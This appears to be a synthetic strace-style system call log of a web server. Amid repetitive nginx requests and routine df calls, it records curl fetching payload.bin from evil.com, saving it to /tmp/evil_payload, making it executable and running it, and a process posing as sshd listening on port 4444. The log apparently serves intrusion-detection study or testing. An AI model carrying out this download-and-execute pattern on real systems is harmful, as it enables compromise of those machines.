[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(52239), sin_addr=inet_addr("192.168.1.142")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(52778), sin_addr=inet_addr("192.168.1.177")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(59795), sin_addr=inet_addr("192.168.1.121")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(58949), sin_addr=inet_addr("192.168.1.188")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(57120), sin_addr=inet_addr("192.168.1.173")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(55457), sin_addr=inet_addr("192.168.1.150")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(54975), sin_addr=inet_addr("192.168.1.132")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(52879), sin_addr=inet_addr("192.168.1.184")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(54711), sin_addr=inet_addr("192.168.1.110")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(65384), sin_addr=inet_addr("192.168.1.182")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(58091), sin_addr=inet_addr("192.168.1.103")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(55428), sin_addr=inet_addr("192.168.1.188")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(54669), sin_addr=inet_addr("192.168.1.158")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(52115), sin_addr=inet_addr("192.168.1.183")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(56364), sin_addr=inet_addr("192.168.1.101")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 1001] accept(3, {sa_family=AF_INET, sin_port=htons(50698), sin_addr=inet_addr("192.168.1.145")}, 16) = 4
[pid 1001] read(4, "GET /index.html HTTP/1.1\\r\\nHost: netwatch.local\\r\\n\\r\\n", 1024) = 54
[pid 1001] openat(AT_FDCWD, "/var/www/html/index.html", O_RDONLY) = 5
[pid 1001] read(5, "<html><body><h1>Nginx Server</h1></body></html>", 4096) = 46
[pid 1001] close(5) = 0
[pid 1001] write(4, "HTTP/1.1 200 OK\\r\\nContent-Length: 46\\r\\n\\r\\n<html><body><h1>Nginx Server</h1></body></html>", 100) = 100
[pid 1001] close(4) = 0
[pid 3020] execve("/usr/bin/vim", ["vim"], 0x7fffc2c935f0) = 0
[pid 3020] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3020] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3020] close(3) = 0
[pid 3020] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3020] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3020] close(3) = 0
[pid 3020] openat(AT_FDCWD, "/etc/nginx/nginx.conf", O_RDONLY) = 3
[pid 3020] read(3, "config_line_0\\n", 80) = 15
[pid 3020] read(3, "config_line_1\\n", 80) = 15
[pid 3020] read(3, "config_line_2\\n", 80) = 15
[pid 3020] read(3, "config_line_3\\n", 80) = 15
[pid 3020] read(3, "config_line_4\\n", 80) = 15
[pid 3020] read(3, "config_line_5\\n", 80) = 15
[pid 3020] read(3, "config_line_6\\n", 80) = 15
[pid 3020] read(3, "config_line_7\\n", 80) = 15
[pid 3020] read(3, "config_line_8\\n", 80) = 15
[pid 3020] read(3, "config_line_9\\n", 80) = 15
[pid 3020] close(3) = 0
[pid 3020] openat(AT_FDCWD, "/etc/nginx/nginx.conf.tmp", O_WRONLY|O_CREAT) = 3
[pid 3020] write(3, "updated_config\\n", 15) = 15
[pid 3020] close(3) = 0
[pid 2000] execve("/usr/bin/curl", ["curl"], 0x7fffc2c935f0) = 0
[pid 2000] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 2000] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 2000] close(3) = 0
[pid 2000] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 2000] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 2000] close(3) = 0
[pid 2000] socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
[pid 2000] connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("185.190.140.23")}, 16) = 0
[pid 2000] write(3, "GET /payload.bin HTTP/1.1\\r\\nHost: evil.com\\r\\n\\r\\n", 54) = 54
[pid 2000] openat(AT_FDCWD, "/tmp/evil_payload", O_WRONLY|O_CREAT) = 4
[pid 2000] read(3, "malicious_chunk_data_0", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_0", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_1", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_1", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_2", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_2", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_3", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_3", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_4", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_4", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_5", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_5", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_6", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_6", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_7", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_7", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_8", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_8", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_9", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_9", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_10", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_10", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_11", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_11", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_12", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_12", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_13", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_13", 100) = 100
[pid 2000] read(3, "malicious_chunk_data_14", 100) = 100
[pid 2000] write(4, "malicious_chunk_data_14", 100) = 100
[pid 2000] close(4) = 0
[pid 2000] close(3) = 0
[pid 2000] chmod("/tmp/evil_payload", 0755) = 0
[pid 2000] execve("/tmp/evil_payload", ["evil_payload"], 0x7fffc2c935f0) = 0
[pid 2000] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 2000] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 2000] close(3) = 0
[pid 2000] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 2000] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 2000] close(3) = 0
[pid 2200] execve("/usr/sbin/sshd", ["sshd"], 0x7fffc2c935f0) = 0
[pid 2200] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 2200] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 2200] close(3) = 0
[pid 2200] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 2200] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 2200] close(3) = 0
[pid 2200] socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
[pid 2200] bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
[pid 2200] listen(3, 128) = 0
[pid 3030] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3030] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3030] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3030] close(3) = 0
[pid 3030] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3030] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3030] close(3) = 0
[pid 3030] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3030] read(3, "mount_line", 1024) = 100
[pid 3030] close(3) = 0
[pid 3031] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3031] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3031] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3031] close(3) = 0
[pid 3031] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3031] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3031] close(3) = 0
[pid 3031] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3031] read(3, "mount_line", 1024) = 100
[pid 3031] close(3) = 0
[pid 3032] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3032] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3032] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3032] close(3) = 0
[pid 3032] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3032] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3032] close(3) = 0
[pid 3032] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3032] read(3, "mount_line", 1024) = 100
[pid 3032] close(3) = 0
[pid 3033] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3033] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3033] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3033] close(3) = 0
[pid 3033] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3033] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3033] close(3) = 0
[pid 3033] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3033] read(3, "mount_line", 1024) = 100
[pid 3033] close(3) = 0
[pid 3034] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3034] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3034] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3034] close(3) = 0
[pid 3034] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3034] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3034] close(3) = 0
[pid 3034] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3034] read(3, "mount_line", 1024) = 100
[pid 3034] close(3) = 0
[pid 3035] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3035] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3035] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3035] close(3) = 0
[pid 3035] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3035] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3035] close(3) = 0
[pid 3035] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3035] read(3, "mount_line", 1024) = 100
[pid 3035] close(3) = 0
[pid 3036] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3036] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3036] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3036] close(3) = 0
[pid 3036] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3036] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3036] close(3) = 0
[pid 3036] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3036] read(3, "mount_line", 1024) = 100
[pid 3036] close(3) = 0
[pid 3037] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3037] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3037] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3037] close(3) = 0
[pid 3037] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3037] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3037] close(3) = 0
[pid 3037] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3037] read(3, "mount_line", 1024) = 100
[pid 3037] close(3) = 0
[pid 3038] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3038] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3038] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3038] close(3) = 0
[pid 3038] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3038] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3038] close(3) = 0
[pid 3038] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3038] read(3, "mount_line", 1024) = 100
[pid 3038] close(3) = 0
[pid 3039] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3039] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3039] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3039] close(3) = 0
[pid 3039] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3039] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3039] close(3) = 0
[pid 3039] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3039] read(3, "mount_line", 1024) = 100
[pid 3039] close(3) = 0
[pid 3040] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3040] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3040] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3040] close(3) = 0
[pid 3040] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3040] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3040] close(3) = 0
[pid 3040] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3040] read(3, "mount_line", 1024) = 100
[pid 3040] close(3) = 0
[pid 3041] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3041] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3041] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3041] close(3) = 0
[pid 3041] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3041] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3041] close(3) = 0
[pid 3041] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3041] read(3, "mount_line", 1024) = 100
[pid 3041] close(3) = 0
[pid 3042] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3042] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3042] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3042] close(3) = 0
[pid 3042] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3042] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3042] close(3) = 0
[pid 3042] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3042] read(3, "mount_line", 1024) = 100
[pid 3042] close(3) = 0
[pid 3043] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3043] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3043] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3043] close(3) = 0
[pid 3043] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3043] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3043] close(3) = 0
[pid 3043] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3043] read(3, "mount_line", 1024) = 100
[pid 3043] close(3) = 0
[pid 3044] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3044] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3044] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3044] close(3) = 0
[pid 3044] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3044] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3044] close(3) = 0
[pid 3044] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3044] read(3, "mount_line", 1024) = 100
[pid 3044] close(3) = 0
[pid 3045] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3045] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3045] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3045] close(3) = 0
[pid 3045] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3045] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3045] close(3) = 0
[pid 3045] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3045] read(3, "mount_line", 1024) = 100
[pid 3045] close(3) = 0
[pid 3046] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3046] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3046] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3046] close(3) = 0
[pid 3046] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3046] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3046] close(3) = 0
[pid 3046] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3046] read(3, "mount_line", 1024) = 100
[pid 3046] close(3) = 0
[pid 3047] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3047] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3047] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3047] close(3) = 0
[pid 3047] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3047] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3047] close(3) = 0
[pid 3047] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3047] read(3, "mount_line", 1024) = 100
[pid 3047] close(3) = 0
[pid 3048] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
